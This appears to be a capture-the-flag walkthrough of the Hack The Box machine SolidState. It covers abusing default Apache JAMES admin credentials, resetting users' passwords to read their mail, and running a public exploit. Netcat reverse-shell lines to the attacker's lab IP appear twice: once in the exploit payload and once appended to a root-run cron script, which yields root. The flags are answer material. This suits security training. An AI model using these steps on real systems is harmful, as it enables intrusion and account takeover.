Machine: https://app.hackthebox.com/machines/85
IP: 10.10.10.51

# Enumeration

webadmin@solid-state-security.com

25/tcp   open     smtp       JAMES smtpd 2.3.2

Reading the documentation, we can see that we can connect to JAMES smtp server through telnet port 4555

https://documentation.softwareag.com/webmethods/wmsuites/wmsuite10-7/Cross_Product/10-7_Infra_Admin_webhelp/index.html#page/wsi-webhelp/ta-setting_up_apache_james_server.html

We can login with default credential `root:root`

Users
```
listusers
Existing accounts 6
user: james
user: ../../../../../../../../etc/bash_completion.d
user: thomas
user: john
user: mindy
user: mailadmin
```

By being root user, we can set password for other users here as well

```
setpassword james password
```

POP3 (Port 110) is used to read email.
Checking john email, we can see that password is requested for user `mindy`.
```bash
USER john
+OK
pass password
+OK Welcome john
list
+OK 1 743
1 743
.
retr 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: john@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <john@localhost>;
          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
From: mailadmin@localhost
Subject: New Hires access
John, 

Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.

Thank you in advance.

Respectfully,
James
```

Only `mindy` has emails and contains credential.

```bash
telnet 10.10.10.51 110

Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 

USER mindy
+OK
PASS password
+OK Welcome mindy
LIST
+OK 2 1945
1 1109
2 836
.
RETR 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
```

We got credential from this email:

```
username: mindy
pass: P@55W0rd1!2@
```

# Exploitation

We can gather the credential by using method above only if the credential is contained in the email message itself.

This exploit requires user to login via SSH

https://www.exploit-db.com/exploits/50347

User.txt 618e6c0d270311fb82f91ba005a29bca

# Post-Exploitation

We land in rbash shell of Mindy

To avoid being in rbash shell, we need to use netcat reverse shell instead of SSH shell.

https://www.exploit-db.com/exploits/35513

Modify the payload to be nc one liner

`payload = 'nc -e /bin/bash 10.10.16.12 1234'`

Execute this and login with Mindy through SSH to trigger the payload

```bash
mindy@solidstate:~$ ls -la /opt
total 16
drwxr-xr-x  3 root root 4096 Aug 22  2017 .
drwxr-xr-x 22 root root 4096 May 27  2022 ..
drwxr-xr-x 11 root root 4096 Apr 26  2021 james-2.3.2
-rwxrwxrwx  1 root root  105 Aug 22  2017 tmp.py
```

/opt/tmp.py is writable by other and executable by root. Might be a cronjob

```python3
mindy@solidstate:~$ cat /opt/tmp.py 
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()
```

Add one liner to the script for reverse shell

`echo "os.system('nc -e /bin/bash 10.10.16.12 1234')" >> /opt/tmp.py`

Wait few minutes

root.txt a2d3e666e0bef2c01b5c11aaad181e42
![image](https://github.com/Leng-Phirun/OSCP_Prep_TJNull/assets/100512862/40ae2e9f-2c89-4086-bd93-fab435b46ba3)
